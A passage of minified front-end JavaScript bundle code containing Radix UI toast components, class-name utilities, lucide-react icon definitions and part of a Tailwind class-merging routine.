    let t = (r = Object.getOwnPropertyDescriptor(e.props, "ref")) == null ? void 0 : r.get
      , n = t && "isReactWarning"in t && t.isReactWarning;
    return n ? e.ref : (t = (o = Object.getOwnPropertyDescriptor(e, "ref")) == null ? void 0 : o.get,
    n = t && "isReactWarning"in t && t.isReactWarning,
    n ? e.props.ref : e.props.ref || e.ref)
}
function bl({prop: e, defaultProp: t, onChange: n= () => {}
}) {
    const [r,o] = XE({
        defaultProp: t,
        onChange: n
    })
      , s = e !== void 0
      , i = s ? e : r
      , a = Ft(n)
      , l = h.useCallback(u => {
        if (s) {
            const d = typeof u == "function" ? u(e) : u;
            d !== e && a(d)
        } else
            o(u)
    }
    , [s, e, o, a]);
    return [i, l]
}
function XE({defaultProp: e, onChange: t}) {
    const n = h.useState(e)
      , [r] = n
      , o = h.useRef(r)
      , s = Ft(t);
    return h.useEffect( () => {
        o.current !== r && (s(r),
        o.current = r)
    }
    , [r, o, s]),
    n
}
var JE = "VisuallyHidden"
  , du = h.forwardRef( (e, t) => g.jsx(ge.span, {
    ...e,
    ref: t,
    style: {
        position: "absolute",
        border: 0,
        width: 1,
        height: 1,
        padding: 0,
        margin: -1,
        overflow: "hidden",
        clip: "rect(0, 0, 0, 0)",
        whiteSpace: "nowrap",
        wordWrap: "normal",
        ...e.style
    }
}));
du.displayName = JE;
var Vf = "ToastProvider"
  , [zf,eb,tb] = wy("Toast")
  , [by,uA] = Ff("Toast", [tb])
  , [nb,fu] = by(Vf)
  , Cy = e => {
    const {__scopeToast: t, label: n="Notification", duration: r=5e3, swipeDirection: o="right", swipeThreshold: s=50, children: i} = e
      , [a,l] = h.useState(null)
      , [u,c] = h.useState(0)
      , d = h.useRef(!1)
      , p = h.useRef(!1);
    return n.trim() || console.error(`Invalid prop \`label\` supplied to \`${Vf}\`. Expected non-empty \`string\`.`),
    g.jsx(zf.Provider, {
        scope: t,
        children: g.jsx(nb, {
            scope: t,
            label: n,
            duration: r,
            swipeDirection: o,
            swipeThreshold: s,
            toastCount: u,
            viewport: a,
            onViewportChange: l,
            onToastAdd: h.useCallback( () => c(w => w + 1), []),
            onToastRemove: h.useCallback( () => c(w => w - 1), []),
            isFocusedToastEscapeKeyDownRef: d,
            isClosePausedRef: p,
            children: i
        })
    })
}
;
Cy.displayName = Vf;
var ky = "ToastViewport"
  , rb = ["F8"]
  , md = "toast.viewportPause"
  , vd = "toast.viewportResume"
  , Ty = h.forwardRef( (e, t) => {
    const {__scopeToast: n, hotkey: r=rb, label: o="Notifications ({hotkey})", ...s} = e
      , i = fu(ky, n)
      , a = eb(n)
      , l = h.useRef(null)
      , u = h.useRef(null)
      , c = h.useRef(null)
      , d = h.useRef(null)
      , p = Le(t, d, i.onViewportChange)
      , w = r.join("+").replace(/Key/g, "").replace(/Digit/g, "")
      , x = i.toastCount > 0;
    h.useEffect( () => {
        const S = v => {
            var y;
            r.length !== 0 && r.every(_ => v[_] || v.code === _) && ((y = d.current) == null || y.focus())
        }
        ;
        return document.addEventListener("keydown", S),
        () => document.removeEventListener("keydown", S)
    }
    , [r]),
    h.useEffect( () => {
        const S = l.current
          , v = d.current;
        if (x && S && v) {
            const f = () => {
                if (!i.isClosePausedRef.current) {
                    const T = new CustomEvent(md);
                    v.dispatchEvent(T),
                    i.isClosePausedRef.current = !0
                }
            }
              , y = () => {
                if (i.isClosePausedRef.current) {
                    const T = new CustomEvent(vd);
                    v.dispatchEvent(T),
                    i.isClosePausedRef.current = !1
                }
            }
              , _ = T => {
                !S.contains(T.relatedTarget) && y()
            }
              , b = () => {
                S.contains(document.activeElement) || y()
            }
            ;
            return S.addEventListener("focusin", f),
            S.addEventListener("focusout", _),
            S.addEventListener("pointermove", f),
            S.addEventListener("pointerleave", b),
            window.addEventListener("blur", f),
            window.addEventListener("focus", y),
            () => {
                S.removeEventListener("focusin", f),
                S.removeEventListener("focusout", _),
                S.removeEventListener("pointermove", f),
                S.removeEventListener("pointerleave", b),
                window.removeEventListener("blur", f),
                window.removeEventListener("focus", y)
            }
        }
    }
    , [x, i.isClosePausedRef]);
    const m = h.useCallback( ({tabbingDirection: S}) => {
        const f = a().map(y => {
            const _ = y.ref.current
              , b = [_, ...vb(_)];
            return S === "forwards" ? b : b.reverse()
        }
        );
        return (S === "forwards" ? f.reverse() : f).flat()
    }
    , [a]);
    return h.useEffect( () => {
        const S = d.current;
        if (S) {
            const v = f => {
                var b, T, k;
                const y = f.altKey || f.ctrlKey || f.metaKey;
                if (f.key === "Tab" && !y) {
                    const P = document.activeElement
                      , z = f.shiftKey;
                    if (f.target === S && z) {
                        (b = u.current) == null || b.focus();
                        return
                    }
                    const O = m({
                        tabbingDirection: z ? "backwards" : "forwards"
                    })
                      , U = O.findIndex(j => j === P);
                    oc(O.slice(U + 1)) ? f.preventDefault() : z ? (T = u.current) == null || T.focus() : (k = c.current) == null || k.focus()
                }
            }
            ;
            return S.addEventListener("keydown", v),
            () => S.removeEventListener("keydown", v)
        }
    }
    , [a, m]),
    g.jsxs(KE, {
        ref: l,
        role: "region",
        "aria-label": o.replace("{hotkey}", w),
        tabIndex: -1,
        style: {
            pointerEvents: x ? void 0 : "none"
        },
        children: [x && g.jsx(gd, {
            ref: u,
            onFocusFromOutsideViewport: () => {
                const S = m({
                    tabbingDirection: "forwards"
                });
                oc(S)
            }
        }), g.jsx(zf.Slot, {
            scope: n,
            children: g.jsx(ge.ol, {
                tabIndex: -1,
                ...s,
                ref: p
            })
        }), x && g.jsx(gd, {
            ref: c,
            onFocusFromOutsideViewport: () => {
                const S = m({
                    tabbingDirection: "backwards"
                });
                oc(S)
            }
        })]
    })
}
);
Ty.displayName = ky;
var Py = "ToastFocusProxy"
  , gd = h.forwardRef( (e, t) => {
    const {__scopeToast: n, onFocusFromOutsideViewport: r, ...o} = e
      , s = fu(Py, n);
    return g.jsx(du, {
        "aria-hidden": !0,
        tabIndex: 0,
        ...o,
        ref: t,
        style: {
            position: "fixed"
        },
        onFocus: i => {
            var u;
            const a = i.relatedTarget;
            !((u = s.viewport) != null && u.contains(a)) && r()
        }
    })
}
);
gd.displayName = Py;
var pu = "Toast"
  , ob = "toast.swipeStart"
  , sb = "toast.swipeMove"
  , ib = "toast.swipeCancel"
  , ab = "toast.swipeEnd"
  , Ny = h.forwardRef( (e, t) => {
    const {forceMount: n, open: r, defaultOpen: o, onOpenChange: s, ...i} = e
      , [a=!0,l] = bl({
        prop: r,
        defaultProp: o,
        onChange: s
    });
    return g.jsx(na, {
        present: n || a,
        children: g.jsx(cb, {
            open: a,
            ...i,
            ref: t,
            onClose: () => l(!1),
            onPause: Ft(e.onPause),
            onResume: Ft(e.onResume),
            onSwipeStart: fe(e.onSwipeStart, u => {
                u.currentTarget.setAttribute("data-swipe", "start")
            }
            ),
            onSwipeMove: fe(e.onSwipeMove, u => {
                const {x: c, y: d} = u.detail.delta;
                u.currentTarget.setAttribute("data-swipe", "move"),
                u.currentTarget.style.setProperty("--radix-toast-swipe-move-x", `${c}px`),
                u.currentTarget.style.setProperty("--radix-toast-swipe-move-y", `${d}px`)
            }
            ),
            onSwipeCancel: fe(e.onSwipeCancel, u => {
                u.currentTarget.setAttribute("data-swipe", "cancel"),
                u.currentTarget.style.removeProperty("--radix-toast-swipe-move-x"),
                u.currentTarget.style.removeProperty("--radix-toast-swipe-move-y"),
                u.currentTarget.style.removeProperty("--radix-toast-swipe-end-x"),
                u.currentTarget.style.removeProperty("--radix-toast-swipe-end-y")
            }
            ),
            onSwipeEnd: fe(e.onSwipeEnd, u => {
                const {x: c, y: d} = u.detail.delta;
                u.currentTarget.setAttribute("data-swipe", "end"),
                u.currentTarget.style.removeProperty("--radix-toast-swipe-move-x"),
                u.currentTarget.style.removeProperty("--radix-toast-swipe-move-y"),
                u.currentTarget.style.setProperty("--radix-toast-swipe-end-x", `${c}px`),
                u.currentTarget.style.setProperty("--radix-toast-swipe-end-y", `${d}px`),
                l(!1)
            }
            )
        })
    })
}
);
Ny.displayName = pu;
var [lb,ub] = by(pu, {
    onClose() {}
})
  , cb = h.forwardRef( (e, t) => {
    const {__scopeToast: n, type: r="foreground", duration: o, open: s, onClose: i, onEscapeKeyDown: a, onPause: l, onResume: u, onSwipeStart: c, onSwipeMove: d, onSwipeCancel: p, onSwipeEnd: w, ...x} = e
      , m = fu(pu, n)
      , [S,v] = h.useState(null)
      , f = Le(t, j => v(j))
      , y = h.useRef(null)
      , _ = h.useRef(null)
      , b = o || m.duration
      , T = h.useRef(0)
      , k = h.useRef(b)
      , P = h.useRef(0)
      , {onToastAdd: z, onToastRemove: L} = m
      , X = Ft( () => {
        var q;
        (S == null ? void 0 : S.contains(document.activeElement)) && ((q = m.viewport) == null || q.focus()),
        i()
    }
    )
      , O = h.useCallback(j => {
        !j || j === 1 / 0 || (window.clearTimeout(P.current),
        T.current = new Date().getTime(),
        P.current = window.setTimeout(X, j))
    }
    , [X]);
    h.useEffect( () => {
        const j = m.viewport;
        if (j) {
            const q = () => {
                O(k.current),
                u == null || u()
            }
              , K = () => {
                const Y = new Date().getTime() - T.current;
                k.current = k.current - Y,
                window.clearTimeout(P.current),
                l == null || l()
            }
            ;
            return j.addEventListener(md, K),
            j.addEventListener(vd, q),
            () => {
                j.removeEventListener(md, K),
                j.removeEventListener(vd, q)
            }
        }
    }
    , [m.viewport, b, l, u, O]),
    h.useEffect( () => {
        s && !m.isClosePausedRef.current && O(b)
    }
    , [s, b, m.isClosePausedRef, O]),
    h.useEffect( () => (z(),
    () => L()), [z, L]);
    const U = h.useMemo( () => S ? Ly(S) : null, [S]);
    return m.viewport ? g.jsxs(g.Fragment, {
        children: [U && g.jsx(db, {
            __scopeToast: n,
            role: "status",
            "aria-live": r === "foreground" ? "assertive" : "polite",
            "aria-atomic": !0,
            children: U
        }), g.jsx(lb, {
            scope: n,
            onClose: X,
            children: mo.createPortal(g.jsx(zf.ItemSlot, {
                scope: n,
                children: g.jsx(ZE, {
                    asChild: !0,
                    onEscapeKeyDown: fe(a, () => {
                        m.isFocusedToastEscapeKeyDownRef.current || X(),
                        m.isFocusedToastEscapeKeyDownRef.current = !1
                    }
                    ),
                    children: g.jsx(ge.li, {
                        role: "status",
                        "aria-live": "off",
                        "aria-atomic": !0,
                        tabIndex: 0,
                        "data-state": s ? "open" : "closed",
                        "data-swipe-direction": m.swipeDirection,
                        ...x,
                        ref: f,
                        style: {
                            userSelect: "none",
                            touchAction: "none",
                            ...e.style
                        },
                        onKeyDown: fe(e.onKeyDown, j => {
                            j.key === "Escape" && (a == null || a(j.nativeEvent),
                            j.nativeEvent.defaultPrevented || (m.isFocusedToastEscapeKeyDownRef.current = !0,
                            X()))
                        }
                        ),
                        onPointerDown: fe(e.onPointerDown, j => {
                            j.button === 0 && (y.current = {
                                x: j.clientX,
                                y: j.clientY
                            })
                        }
                        ),
                        onPointerMove: fe(e.onPointerMove, j => {
                            if (!y.current)
                                return;
                            const q = j.clientX - y.current.x
                              , K = j.clientY - y.current.y
                              , Y = !!_.current
                              , N = ["left", "right"].includes(m.swipeDirection)
                              , F = ["left", "up"].includes(m.swipeDirection) ? Math.min : Math.max
                              , Q = N ? F(0, q) : 0
                              , re = N ? 0 : F(0, K)
                              , ye = j.pointerType === "touch" ? 10 : 2
                              , et = {
                                x: Q,
                                y: re
                            }
                              , De = {
                                originalEvent: j,
                                delta: et
                            };
                            Y ? (_.current = et,
                            Pa(sb, d, De, {
                                discrete: !1
                            })) : Hh(et, m.swipeDirection, ye) ? (_.current = et,
                            Pa(ob, c, De, {
                                discrete: !1
                            }),
                            j.target.setPointerCapture(j.pointerId)) : (Math.abs(q) > ye || Math.abs(K) > ye) && (y.current = null)
                        }
                        ),
                        onPointerUp: fe(e.onPointerUp, j => {
                            const q = _.current
                              , K = j.target;
                            if (K.hasPointerCapture(j.pointerId) && K.releasePointerCapture(j.pointerId),
                            _.current = null,
                            y.current = null,
                            q) {
                                const Y = j.currentTarget
                                  , N = {
                                    originalEvent: j,
                                    delta: q
                                };
                                Hh(q, m.swipeDirection, m.swipeThreshold) ? Pa(ab, w, N, {
                                    discrete: !0
                                }) : Pa(ib, p, N, {
                                    discrete: !0
                                }),
                                Y.addEventListener("click", F => F.preventDefault(), {
                                    once: !0
                                })
                            }
                        }
                        )
                    })
                })
            }), m.viewport)
        })]
    }) : null
}
)
  , db = e => {
    const {__scopeToast: t, children: n, ...r} = e
      , o = fu(pu, t)
      , [s,i] = h.useState(!1)
      , [a,l] = h.useState(!1);
    return hb( () => i(!0)),
    h.useEffect( () => {
        const u = window.setTimeout( () => l(!0), 1e3);
        return () => window.clearTimeout(u)
    }
    , []),
    a ? null : g.jsx(cu, {
        asChild: !0,
        children: g.jsx(du, {
            ...r,
            children: s && g.jsxs(g.Fragment, {
                children: [o.label, " ", n]
            })
        })
    })
}
  , fb = "ToastTitle"
  , Ry = h.forwardRef( (e, t) => {
    const {__scopeToast: n, ...r} = e;
    return g.jsx(ge.div, {
        ...r,
        ref: t
    })
}
);
Ry.displayName = fb;
var pb = "ToastDescription"
  , Ay = h.forwardRef( (e, t) => {
    const {__scopeToast: n, ...r} = e;
    return g.jsx(ge.div, {
        ...r,
        ref: t
    })
}
);
Ay.displayName = pb;
var Oy = "ToastAction"
  , jy = h.forwardRef( (e, t) => {
    const {altText: n, ...r} = e;
    return n.trim() ? g.jsx(Iy, {
        altText: n,
        asChild: !0,
        children: g.jsx($f, {
            ...r,
            ref: t
        })
    }) : (console.error(`Invalid prop \`altText\` supplied to \`${Oy}\`. Expected non-empty \`string\`.`),
    null)
}
);
jy.displayName = Oy;
var My = "ToastClose"
  , $f = h.forwardRef( (e, t) => {
    const {__scopeToast: n, ...r} = e
      , o = ub(My, n);
    return g.jsx(Iy, {
        asChild: !0,
        children: g.jsx(ge.button, {
            type: "button",
            ...r,
            ref: t,
            onClick: fe(e.onClick, o.onClose)
        })
    })
}
);
$f.displayName = My;
var Iy = h.forwardRef( (e, t) => {
    const {__scopeToast: n, altText: r, ...o} = e;
    return g.jsx(ge.div, {
        "data-radix-toast-announce-exclude": "",
        "data-radix-toast-announce-alt": r || void 0,
        ...o,
        ref: t
    })
}
);
function Ly(e) {
    const t = [];
    return Array.from(e.childNodes).forEach(r => {
        if (r.nodeType === r.TEXT_NODE && r.textContent && t.push(r.textContent),
        mb(r)) {
            const o = r.ariaHidden || r.hidden || r.style.display === "none"
              , s = r.dataset.radixToastAnnounceExclude === "";
            if (!o)
                if (s) {
                    const i = r.dataset.radixToastAnnounceAlt;
                    i && t.push(i)
                } else
                    t.push(...Ly(r))
        }
    }
    ),
    t
}
function Pa(e, t, n, {discrete: r}) {
    const o = n.originalEvent.currentTarget
      , s = new CustomEvent(e,{
        bubbles: !0,
        cancelable: !0,
        detail: n
    });
    t && o.addEventListener(e, t, {
        once: !0
    }),
    r ? xy(o, s) : o.dispatchEvent(s)
}
var Hh = (e, t, n=0) => {
    const r = Math.abs(e.x)
      , o = Math.abs(e.y)
      , s = r > o;
    return t === "left" || t === "right" ? s && r > n : !s && o > n
}
;
function hb(e= () => {}
) {
    const t = Ft(e);
    ft( () => {
        let n = 0
          , r = 0;
        return n = window.requestAnimationFrame( () => r = window.requestAnimationFrame(t)),
        () => {
            window.cancelAnimationFrame(n),
            window.cancelAnimationFrame(r)
        }
    }
    , [t])
}
function mb(e) {
    return e.nodeType === e.ELEMENT_NODE
}
function vb(e) {
    const t = []
      , n = document.createTreeWalker(e, NodeFilter.SHOW_ELEMENT, {
        acceptNode: r => {
            const o = r.tagName === "INPUT" && r.type === "hidden";
            return r.disabled || r.hidden || o ? NodeFilter.FILTER_SKIP : r.tabIndex >= 0 ? NodeFilter.FILTER_ACCEPT : NodeFilter.FILTER_SKIP
        }
    });
    for (; n.nextNode(); )
        t.push(n.currentNode);
    return t
}
function oc(e) {
    const t = document.activeElement;
    return e.some(n => n === t ? !0 : (n.focus(),
    document.activeElement !== t))
}
var gb = Cy
  , Dy = Ty
  , Fy = Ny
  , Vy = Ry
  , zy = Ay
  , $y = jy
  , Uy = $f;
function By(e) {
    var t, n, r = "";
    if (typeof e == "string" || typeof e == "number")
        r += e;
    else if (typeof e == "object")
        if (Array.isArray(e)) {
            var o = e.length;
            for (t = 0; t < o; t++)
                e[t] && (n = By(e[t])) && (r && (r += " "),
                r += n)
        } else
            for (n in e)
                e[n] && (r && (r += " "),
                r += n);
    return r
}
function Hy() {
    for (var e, t, n = 0, r = "", o = arguments.length; n < o; n++)
        (e = arguments[n]) && (t = By(e)) && (r && (r += " "),
        r += t);
    return r
}
const Wh = e => typeof e == "boolean" ? `${e}` : e === 0 ? "0" : e
  , Zh = Hy
  , Uf = (e, t) => n => {
    var r;
    if ((t == null ? void 0 : t.variants) == null)
        return Zh(e, n == null ? void 0 : n.class, n == null ? void 0 : n.className);
    const {variants: o, defaultVariants: s} = t
      , i = Object.keys(o).map(u => {
        const c = n == null ? void 0 : n[u]
          , d = s == null ? void 0 : s[u];
        if (c === null)
            return null;
        const p = Wh(c) || Wh(d);
        return o[u][p]
    }
    )
      , a = n && Object.entries(n).reduce( (u, c) => {
        let[d,p] = c;
        return p === void 0 || (u[d] = p),
        u
    }
    , {})
      , l = t == null || (r = t.compoundVariants) === null || r === void 0 ? void 0 : r.reduce( (u, c) => {
        let {class: d, className: p, ...w} = c;
        return Object.entries(w).every(x => {
            let[m,S] = x;
            return Array.isArray(S) ? S.includes({
                ...s,
                ...a
            }[m]) : {
                ...s,
                ...a
            }[m] === S
        }
        ) ? [...u, d, p] : u
    }
    , []);
    return Zh(e, i, l, n == null ? void 0 : n.class, n == null ? void 0 : n.className)
}
;
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const yb = e => e.replace(/([a-z0-9])([A-Z])/g, "$1-$2").toLowerCase()
  , Wy = (...e) => e.filter( (t, n, r) => !!t && r.indexOf(t) === n).join(" ");
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
var wb = {
    xmlns: "http://www.w3.org/2000/svg",
    width: 24,
    height: 24,
    viewBox: "0 0 24 24",
    fill: "none",
    stroke: "currentColor",
    strokeWidth: 2,
    strokeLinecap: "round",
    strokeLinejoin: "round"
};
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const xb = h.forwardRef( ({color: e="currentColor", size: t=24, strokeWidth: n=2, absoluteStrokeWidth: r, className: o="", children: s, iconNode: i, ...a}, l) => h.createElement("svg", {
    ref: l,
    ...wb,
    width: t,
    height: t,
    stroke: e,
    strokeWidth: r ? Number(n) * 24 / Number(t) : n,
    className: Wy("lucide", o),
    ...a
}, [...i.map( ([u,c]) => h.createElement(u, c)), ...Array.isArray(s) ? s : [s]]));
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const $t = (e, t) => {
    const n = h.forwardRef( ({className: r, ...o}, s) => h.createElement(xb, {
        ref: s,
        iconNode: t,
        className: Wy(`lucide-${yb(e)}`, r),
        ...o
    }));
    return n.displayName = `${e}`,
    n
}
;
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Sb = $t("ArrowRight", [["path", {
    d: "M5 12h14",
    key: "1ays0h"
}], ["path", {
    d: "m12 5 7 7-7 7",
    key: "xquz4c"
}]]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const _b = $t("Check", [["path", {
    d: "M20 6 9 17l-5-5",
    key: "1gmf2c"
}]]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Zy = $t("ChevronDown", [["path", {
    d: "m6 9 6 6 6-6",
    key: "qrunsl"
}]]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Eb = $t("ChevronUp", [["path", {
    d: "m18 15-6-6-6 6",
    key: "153udz"
}]]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const bb = $t("CircleAlert", [["circle", {
    cx: "12",
    cy: "12",
    r: "10",
    key: "1mglay"
}], ["line", {
    x1: "12",
    x2: "12",
    y1: "8",
    y2: "12",
    key: "1pkeuh"
}], ["line", {
    x1: "12",
    x2: "12.01",
    y1: "16",
    y2: "16",
    key: "4dfq90"
}]]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Cb = $t("CircleCheck", [["circle", {
    cx: "12",
    cy: "12",
    r: "10",
    key: "1mglay"
}], ["path", {
    d: "m9 12 2 2 4-4",
    key: "dzmm74"
}]]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const kb = $t("EyeOff", [["path", {
    d: "M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49",
    key: "ct8e1f"
}], ["path", {
    d: "M14.084 14.158a3 3 0 0 1-4.242-4.242",
    key: "151rxh"
}], ["path", {
    d: "M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143",
    key: "13bj9a"
}], ["path", {
    d: "m2 2 20 20",
    key: "1ooewy"
}]]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Tb = $t("Eye", [["path", {
    d: "M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0",
    key: "1nclc0"
}], ["circle", {
    cx: "12",
    cy: "12",
    r: "3",
    key: "1v7zrd"
}]]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Pb = $t("Laptop", [["path", {
    d: "M20 16V7a2 2 0 0 0-2-2H6a2 2 0 0 0-2 2v9m16 0H4m16 0 1.28 2.55a1 1 0 0 1-.9 1.45H3.62a1 1 0 0 1-.9-1.45L4 16",
    key: "tarvll"
}]]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Nb = $t("MessageSquare", [["path", {
    d: "M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z",
    key: "1lielz"
}]]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Rb = $t("Search", [["circle", {
    cx: "11",
    cy: "11",
    r: "8",
    key: "4ej97u"
}], ["path", {
    d: "m21 21-4.3-4.3",
    key: "1qie3q"
}]]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Ab = $t("Smartphone", [["rect", {
    width: "14",
    height: "20",
    x: "5",
    y: "2",
    rx: "2",
    ry: "2",
    key: "1yt0o3"
}], ["path", {
    d: "M12 18h.01",
    key: "mhygvu"
}]]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Ky = $t("X", [["path", {
    d: "M18 6 6 18",
    key: "1bl5f8"
}], ["path", {
    d: "m6 6 12 12",
    key: "d8bk6v"
}]])
  , Bf = "-"
  , Ob = e => {
    const t = Mb(e)
      , {conflictingClassGroups: n, conflictingClassGroupModifiers: r} = e;
    return {
        getClassGroupId: i => {
            const a = i.split(Bf);
            return a[0] === "" && a.length !== 1 && a.shift(),
            Qy(a, t) || jb(i)
        }
        ,
        getConflictingClassGroupIds: (i, a) => {
            const l = n[i] || [];
            return a && r[i] ? [...l, ...r[i]] : l
        }
    }
}
  , Qy = (e, t) => {
    var i;
    if (e.length === 0)
        return t.classGroupId;
    const n = e[0]
      , r = t.nextPart.get(n)
      , o = r ? Qy(e.slice(1), r) : void 0;
    if (o)
        return o;
    if (t.validators.length === 0)
        return;
    const s = e.join(Bf);
    return (i = t.validators.find( ({validator: a}) => a(s))) == null ? void 0 : i.classGroupId
}
  , Kh = /^\[(.+)\]$/
  , jb = e => {
    if (Kh.test(e)) {
        const t = Kh.exec(e)[1]
          , n = t == null ? void 0 : t.substring(0, t.indexOf(":"));
        if (n)
            return "arbitrary.." + n
    }
}
  , Mb = e => {
    const {theme: t, prefix: n} = e
      , r = {
        nextPart: new Map,
        validators: []
    };
    return Lb(Object.entries(e.classGroups), n).forEach( ([s,i]) => {
        yd(i, r, s, t)
    }
    ),
    r
}
  , yd = (e, t, n, r) => {
    e.forEach(o => {
        if (typeof o == "string") {
            const s = o === "" ? t : Qh(t, o);
            s.classGroupId = n;
            return
        }
        if (typeof o == "function") {
            if (Ib(o)) {
                yd(o(r), t, n, r);
                return
            }
            t.validators.push({
                validator: o,
                classGroupId: n
            });
            return
        }
        Object.entries(o).forEach( ([s,i]) => {
            yd(i, Qh(t, s), n, r)
        }
        )
    }
    )
}
  , Qh = (e, t) => {
    let n = e;
    return t.split(Bf).forEach(r => {
        n.nextPart.has(r) || n.nextPart.set(r, {
            nextPart: new Map,
            validators: []
        }),
        n = n.nextPart.get(r)
    }
    ),
    n
}
  , Ib = e => e.isThemeGetter
  , Lb = (e, t) => t ? e.map( ([n,r]) => {
    const o = r.map(s => typeof s == "string" ? t + s : typeof s == "object" ? Object.fromEntries(Object.entries(s).map( ([i,a]) => [t + i, a])) : s);
    return [n, o]
}
) : e
  , Db = e => {
    if (e < 1)
        return {
            get: () => {}
            ,
            set: () => {}
        };
    let t = 0
      , n = new Map
      , r = new Map;
    const o = (s, i) => {
        n.set(s, i),
        t++,
        t > e && (t = 0,
        r = n,
        n = new Map)
    }
    ;
    return {
        get(s) {
            let i = n.get(s);
            if (i !== void 0)
                return i;
            if ((i = r.get(s)) !== void 0)
                return o(s, i),
                i
        },
        set(s, i) {
            n.has(s) ? n.set(s, i) : o(s, i)
        }
    }
}
  , qy = "!"
  , Fb = e => {
    const {separator: t, experimentalParseClassName: n} = e
      , r = t.length === 1
      , o = t[0]
      , s = t.length
      , i = a => {
        const l = [];
        let u = 0, c = 0, d;
        for (let S = 0; S < a.length; S++) {
            let v = a[S];
            if (u === 0) {
                if (v === o && (r || a.slice(S, S + s) === t)) {
                    l.push(a.slice(c, S)),
                    c = S + s;
                    continue
                }
                if (v === "/") {
                    d = S;
                    continue
                }
            }
            v === "[" ? u++ : v === "]" && u--
        }
        const p = l.length === 0 ? a : a.substring(c)
          , w = p.startsWith(qy)
          , x = w ? p.substring(1) : p
          , m = d && d > c ? d - c : void 0;
        return {
            modifiers: l,
            hasImportantModifier: w,
            baseClassName: x,
            maybePostfixModifierPosition: m
        }
    }
    ;
    return n ? a => n({
        className: a,
        parseClassName: i
    }) : i
}
  , Vb = e => {
    if (e.length <= 1)
        return e;
    const t = [];
    let n = [];
    return e.forEach(r => {
        r[0] === "[" ? (t.push(...n.sort(), r),
        n = []) : n.push(r)
    }
    ),
    t.push(...n.sort()),
    t
}
  , zb = e => ({
    cache: Db(e.cacheSize),
    parseClassName: Fb(e),
    ...Ob(e)
})
  , $b = /\s+/
  , Ub = (e, t) => {
    const {parseClassName: n, getClassGroupId: r, getConflictingClassGroupIds: o} = t
      , s = []
      , i = e.trim().split($b);
    let a = "";
    for (let l = i.length - 1; l >= 0; l -= 1) {
        const u = i[l]
          , {modifiers: c, hasImportantModifier: d, baseClassName: p, maybePostfixModifierPosition: w} = n(u);
        let x = !!w
          , m = r(x ? p.substring(0, w) : p);
        if (!m) {
            if (!x) {
                a = u + (a.length > 0 ? " " + a : a);
                continue
            }
            if (m = r(p),
            !m) {
                a = u + (a.length > 0 ? " " + a : a);
                continue
            }
            x = !1
        }
        const S = Vb(c).join(":")
          , v = d ? S + qy : S
          , f = v + m;
        if (s.includes(f))
            continue;
        s.push(f);
        const y = o(m, x);
        for (let _ = 0; _ < y.length; ++_) {
            const b = y[_];
            s.push(v + b)
        }
        a = u + (a.length > 0 ? " " + a : a)
    }
    return a
}
;
function Bb() {
    let e = 0, t, n, r = "";
    for (; e < arguments.length; )
        (t = arguments[e++]) && (n = Gy(t)) && (r && (r += " "),
        r += n);
    return r
}
const Gy = e => {
    if (typeof e == "string")
        return e;
    let t, n = "";
    for (let r = 0; r < e.length; r++)
        e[r] && (t = Gy(e[r])) && (n && (n += " "),
        n += t);
    return n
}
;
function Hb(e, ...t) {
    let n, r, o, s = i;
    function i(l) {
        const u = t.reduce( (c, d) => d(c), e());
        return n = zb(u),
        r = n.cache.get,
        o = n.cache.set,
        s = a,
        a(l)
    }
    function a(l) {
        const u = r(l);
        if (u)
            return u;
        const c = Ub(l, n);
        return o(l, c),
        c
    }
    return function() {
        return s(Bb.apply(null, arguments))
    }
}
const ke = e => {
    const t = n => n[e] || [];
    return t.isThemeGetter = !0,
    t
}
  , Yy = /^\[(?:([a-z-]+):)?(.+)\]$/i
  , Wb = /^\d+\/\d+$/
  , Zb = new Set(["px", "full", "screen"])
  , Kb = /^(\d+(\.\d+)?)?(xs|sm|md|lg|xl)$/
